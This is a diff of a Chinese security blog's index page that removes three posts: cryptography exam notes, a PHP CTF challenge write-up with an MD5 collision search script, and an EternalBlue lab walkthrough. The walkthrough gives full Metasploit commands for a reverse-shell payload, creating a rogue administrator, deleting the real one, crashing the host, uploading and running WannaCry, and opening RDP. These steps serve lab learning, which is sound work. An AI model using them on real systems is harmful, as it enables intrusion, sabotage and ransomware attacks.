@@ -287,7 +287,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/22/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/10/%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="w1ndy">
@@ -306,7 +306,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/06/22/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" itemprop="url">现代密码学期末复习</a></h1>
+                <a class="post-title-link" href="/2020/05/10/%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0RCE/" itemprop="url">无参函数RCE</a></h1>
         
 
         <div class="post-meta">
@@ -318,8 +318,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-22T20:03:40+08:00">
-                2020-06-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-10T22:48:49+08:00">
+                2020-05-10
               </time>
             
 
@@ -334,377 +334,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-06-26T19:06:19+08:00">
-                2020-06-26
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">课程笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="第一章-引言"><a href="#第一章-引言" class="headerlink" title="第一章 (引言)"></a>第一章 (引言)</h3><h4 id="清楚信息安全专业学习密码学的原因"><a href="#清楚信息安全专业学习密码学的原因" class="headerlink" title="清楚信息安全专业学习密码学的原因"></a>清楚信息安全专业学习密码学的原因</h4><p>0、密码技术是信息安全的核心技术<br>1、密码技术已经广泛应用于通信保密、信息系统安全、网络安全、云计算安全、区块链安全等多个信息安全的重要领域中</p>
-<h3 id="第二章-流密码"><a href="#第二章-流密码" class="headerlink" title="第二章 (流密码)"></a>第二章 (流密码)</h3><h4 id="掌握流密码的基本思想"><a href="#掌握流密码的基本思想" class="headerlink" title="掌握流密码的基本思想"></a>掌握流密码的基本思想</h4><p>流密码的基本思想是利用密钥k产生一个密钥流z=z0z1…,并使用如下规则对明文串x=x0x1x2…加密：y=y0y1y2…=Ez0(x0)Ez1(x1)Ez2(x2)…。密钥流由密钥流发生器产生：zi=f(k,σi),这里σi是加密器中的记忆元件(存储器)在时刻i的状态,f是由密钥k和σi产生的函数</p>
-<h3 id="第三章-分组密码"><a href="#第三章-分组密码" class="headerlink" title="第三章 (分组密码)"></a>第三章 (分组密码)</h3><h4 id="理解分组密码的CBC工作模式，能够画出该模式的加密示意图"><a href="#理解分组密码的CBC工作模式，能够画出该模式的加密示意图" class="headerlink" title="理解分组密码的CBC工作模式，能够画出该模式的加密示意图"></a>理解分组密码的CBC工作模式，能够画出该模式的加密示意图</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ClassNote/CBC.jpg" alt=""></p>
-<h4 id="能够根据给定的一个字节a-给定的AES仿射变换-和不可约多项式m-x-，求出字节a在AES中S盒字节代替变换的结果"><a href="#能够根据给定的一个字节a-给定的AES仿射变换-和不可约多项式m-x-，求出字节a在AES中S盒字节代替变换的结果" class="headerlink" title="能够根据给定的一个字节a,给定的AES仿射变换(*)和不可约多项式m(x)，求出字节a在AES中S盒字节代替变换的结果"></a>能够根据给定的一个字节a,给定的AES仿射变换(*)和不可约多项式m(x)，求出字节a在AES中S盒字节代替变换的结果</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ClassNote/Sbox.jpg" alt=""><br>考试中求逆时，不需要使用欧几里得算法，直接一个一个试就行了(老师说给的逆很容易试出来)</p>
-<h3 id="第四章-公钥密码"><a href="#第四章-公钥密码" class="headerlink" title="第四章 (公钥密码)"></a>第四章 (公钥密码)</h3><h4 id="能够根据RSA算法进行加密与解密计算"><a href="#能够根据RSA算法进行加密与解密计算" class="headerlink" title="能够根据RSA算法进行加密与解密计算"></a>能够根据RSA算法进行加密与解密计算</h4><p>选两个保密的大素数p和q<br>计算n=p<em>q，φ(n)=(p-1)(q-1),其中φ(n)是n的欧拉函数值<br>选一整数e，满足1 &lt; e &lt; φ(n)，且gcd(φ(n),e)=1，这里的(e,n)就是公钥<br>计算d，满足d</em>e ≡ 1 mod(φ(n))，这里的(d,n)就是私钥<br>加密过程：对于明文m，c ≡ (m^e) mod(n)，c就是m加密后的密文<br>解密过程：m ≡ (c^d) mod(n)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*b(mod q)=a(mod q) * b(mod q)</span><br></pre></td></tr></table></figure>
-<h3 id="第五章-数字签名"><a href="#第五章-数字签名" class="headerlink" title="第五章 (数字签名)"></a>第五章 (数字签名)</h3><h4 id="能够使用Elgamal数字签名体制，进行签名与验证计算"><a href="#能够使用Elgamal数字签名体制，进行签名与验证计算" class="headerlink" title="能够使用Elgamal数字签名体制，进行签名与验证计算"></a>能够使用Elgamal数字签名体制，进行签名与验证计算</h4><p>选取大素数p，生成元g，p、g公开<br>随机选取整数x，1 ≤ x ≤ p-2，计算y ≡ g^x mod(p)<br>公钥为y，私钥为x<br>签名算法：对于消息m，随机选取整数k，1 ≤ k ≤ p-2，计算r=g^k mod(p)，s=(H(m)-x<em>r)k^(-1) mod(p-1)<br>注意：这里的k^-1是k的逆，不是倒数,即k*k^-1 ≡ 1 mod(p-1)<br>m的签名为(r,s)，其中H为Hash函数，老师说考试直接用m来代替H(m)进行计算<br>验证算法：接收到消息m和签名(r,m)后，验证(y^r)</em>(r^s) ≡ g^H(m) mod(p)<br>如果成立则签名有效，反之签名无效</p>
-<h3 id="第六章-哈希函数"><a href="#第六章-哈希函数" class="headerlink" title="第六章 (哈希函数)"></a>第六章 (哈希函数)</h3><h4 id="理解弱单向函数与强单向函数的定义"><a href="#理解弱单向函数与强单向函数的定义" class="headerlink" title="理解弱单向函数与强单向函数的定义"></a>理解弱单向函数与强单向函数的定义</h4><p>单向函数：已知h,求H(x)=h的x在计算上是不可行的，这一性质称为函数的单向性<br>弱单向函数：已知x,找出y(y≠x)使得H(y)=H(x)在计算上是不可行的<br>强单向函数：找出任意两个不同的输入x、y,使得H(y)=H(x)在计算上是不可行的</p>
-<h3 id="第八章-密钥分配与密钥管理"><a href="#第八章-密钥分配与密钥管理" class="headerlink" title="第八章 (密钥分配与密钥管理)"></a>第八章 (密钥分配与密钥管理)</h3><h4 id="能够基于D-H密钥交换协议计算生成通信双方的共享密钥"><a href="#能够基于D-H密钥交换协议计算生成通信双方的共享密钥" class="headerlink" title="能够基于D-H密钥交换协议计算生成通信双方的共享密钥"></a>能够基于D-H密钥交换协议计算生成通信双方的共享密钥</h4><p><a href="https://zxfireworks.xyz/2020/02/26/%E5%AF%86%E7%A0%81%E5%AD%A6/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/02/26/%E5%AF%86%E7%A0%81%E5%AD%A6/</a></p>
-<h3 id="第九章-密码协议"><a href="#第九章-密码协议" class="headerlink" title="第九章 (密码协议)"></a>第九章 (密码协议)</h3><h4 id="了解密码协议的定义"><a href="#了解密码协议的定义" class="headerlink" title="了解密码协议的定义"></a>了解密码协议的定义</h4><p>密码协议是指利用密码工具实现与安全相关的协议或函数的计算</p>
-<h3 id="第十章-可证明安全"><a href="#第十章-可证明安全" class="headerlink" title="第十章 (可证明安全)"></a>第十章 (可证明安全)</h3><h4 id="了解可证明安全的思想"><a href="#了解可证明安全的思想" class="headerlink" title="了解可证明安全的思想"></a>了解可证明安全的思想</h4><p>利用概率论和计算复杂性理论，把对密码系统的安全性归约到已知的数学困难问题上。这个评估方法只是说明了这个密码算法的安全性与某个困难问题相关，没有完全证明问题本身的安全性，并给出它们的等价性证明</p>
-<h3 id="第十一章-密码学新方向"><a href="#第十一章-密码学新方向" class="headerlink" title="第十一章 (密码学新方向)"></a>第十一章 (密码学新方向)</h3><h4 id="能够知道5种密码学新方向或新技术"><a href="#能够知道5种密码学新方向或新技术" class="headerlink" title="能够知道5种密码学新方向或新技术"></a>能够知道5种密码学新方向或新技术</h4><p>0、身份基加密<br>1、属性基加密<br>2、全同态加密<br>3、后量子密码<br>4、DNA密码<br>5、混沌密码</p>
-<h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><h4 id="介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性"><a href="#介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性" class="headerlink" title="介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性"></a>介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性</h4><p>安全场景：银行系统中基于PKI的USB Key身份认证系统<br>密码技术：公钥密码体制、身份认证<br>基于PKI的”数字证书认证方式”可以有效地保证用户的身份安全和数据传输安全。在USBKey内用私钥将原文加密，与原文和数字证书一起打包通过网络传输，服务器端接收到后还原出数字证书，利用公钥解密，结果与原文校验，确定用户合法性。而数字证书存储在USBKey中可以保障数字证书无法被复制，所有密钥运算在USBKey中实现，用户密钥不在计算机内存出现也不在网络中传播，只有USBKey的持有人才能够对数字证书进行操作</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/09/EternalBlue/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="w1ndy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/06/09/EternalBlue/" itemprop="url">EternalBlue</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-09T15:32:31+08:00">
-                2020-06-09
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2020-06-10T23:37:13+08:00">
-                2020-06-10
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>攻击机：Kali<br>靶机：Win7<br>在测试前需要拿到靶机的公网ip地址<br>这里的靶机ip地址为192.168.1.106<br>靶机需要打开位于 控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;高级共享设置 中的启用网络发现和启用文件和打印机共享</p>
-<h3 id="测试靶机是否有永恒之蓝漏洞"><a href="#测试靶机是否有永恒之蓝漏洞" class="headerlink" title="测试靶机是否有永恒之蓝漏洞"></a>测试靶机是否有永恒之蓝漏洞</h3><p>靶机需要满足开启445端口，使用Nmap端口扫描</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.106</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_0.jpg" alt=""><br>靶机开启了139和445端口，就可以进行测试了</p>
-<h3 id="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"><a href="#使用Metasploit利用永恒之蓝漏洞对靶机进行渗透" class="headerlink" title="使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"></a>使用Metasploit利用永恒之蓝漏洞对靶机进行渗透</h3><p>在Kali中打开Metasploit</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>搜索ms17-010,永恒之蓝漏洞的exp</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_1.jpg" alt=""><br>第三个就是要找的exp，使用这个exp</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
-<p>查看一下需要配置那些参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_2.jpg" alt=""><br>发现RHOSTS还没有配置，配置RHOSTS,也就是靶机的ip</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.1.106</span><br></pre></td></tr></table></figure>
-<p>配置payload,先查询一下有哪些可用的payload<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_3.jpg" alt=""><br>这里需要找一个可以反向连接的payload,第15条就可以</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-<p>查看一下需要配置那些参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_4.jpg" alt=""><br>需要配置LHOST,也就是攻击机的ip地址</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br></pre></td></tr></table></figure>
-<p>执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit 或者 run</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_5.jpg" alt=""><br>攻击成功，接下来就可对靶机进行操作了，在开始前已经在靶机的桌面建了一个win7.txt的文件，尝试去把它下载到本地<br>将目录切换到桌面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_6.jpg" alt=""><br>将win7.txt文件下载到本地</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download win7.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_7.jpg" alt=""><br>还可以进行提权，先进入windows的命令行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-<p>查看所有的用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
-<p>创建一个新用户hacker,密码为123456</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker 123456 /add</span><br></pre></td></tr></table></figure>
-<p>将该普通用户提权为管理员用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators hacker /add</span><br></pre></td></tr></table></figure>
-<p>删除原来的管理员用户w1ndy</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user w1ndy /del</span><br></pre></td></tr></table></figure>
-<p>kill掉wininit.exe进程，直接打蓝屏，重启一下就好了<br>``bash<br>taskkill /f /im wininit.exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">还有很多命令可以执行，可以使用&quot;help&quot;这个命令来查看</span><br><span class="line">比如，截屏命令</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure>
-<h3 id="渗透成功后上传WannaCry勒索软件"><a href="#渗透成功后上传WannaCry勒索软件" class="headerlink" title="渗透成功后上传WannaCry勒索软件"></a>渗透成功后上传WannaCry勒索软件</h3><p>永恒之蓝病毒样本：<a href="https://bbs.pediy.com/thread-217586.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217586.htm</a><br>将wcry2文件夹上传到靶机的C盘下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload wcry2 c:/</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_8.jpg" alt=""><br>用shell命令切换到win7的终端运行该病毒</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wcry.exe</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_9.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_10.jpg" alt=""></p>
-<p>Meterpreter常用命令<br><a href="https://www.cnblogs.com/wjw-zm/p/11688992.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjw-zm/p/11688992.html</a><br><a href="https://www.cnblogs.com/maohai-kdg/p/12915718.html" target="_blank" rel="noopener">https://www.cnblogs.com/maohai-kdg/p/12915718.html</a></p>
-<h3 id="利用rdesktop远程连接靶机桌面"><a href="#利用rdesktop远程连接靶机桌面" class="headerlink" title="利用rdesktop远程连接靶机桌面"></a>利用rdesktop远程连接靶机桌面</h3><p>连接之前需要一个靶机的账户，开启靶机的3389端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
-<p>该命令就可开启靶机的3389端口<br>将靶机的3389端口转发到本地的6666端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_11.jpg" alt=""><br>接下来就可以用rdesktop连接靶机了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_12.jpg" alt=""><br>连接成功后就会弹出登陆界面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_13.jpg" alt=""><br>登陆即可</p>
-<p>针对win xp还可以利用ms08-067漏洞</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/23/WHUCTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="w1ndy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/23/WHUCTF/" itemprop="url">WHUCTF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-23T15:24:33+08:00">
-                2020-05-23
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-28T23:46:55+08:00">
-                2020-05-28
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-13T14:23:26+08:00">
+                2020-05-13
               </time>
             
           </span>
@@ -760,39 +391,333 @@
 
       
         
-          
-            <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">//1st</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2nd</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//3nd</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(unserialize(<span class="variable">$r</span>)[1] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一关：利用%0a绕过(%0a经过url编码后时回车)<br>第二关：0e绕过(找到两个数，md5后都是0e开头的就可)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$count</span> = 0;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 1; <span class="variable">$i</span> &lt;= 100000000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$md5</span> = strtr(md5(<span class="variable">$i</span>), <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^0e\d+$/'</span>, <span class="variable">$md5</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span> . <span class="string">" "</span> . md5(<span class="variable">$i</span>) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="variable">$count</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> == 2) &#123;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
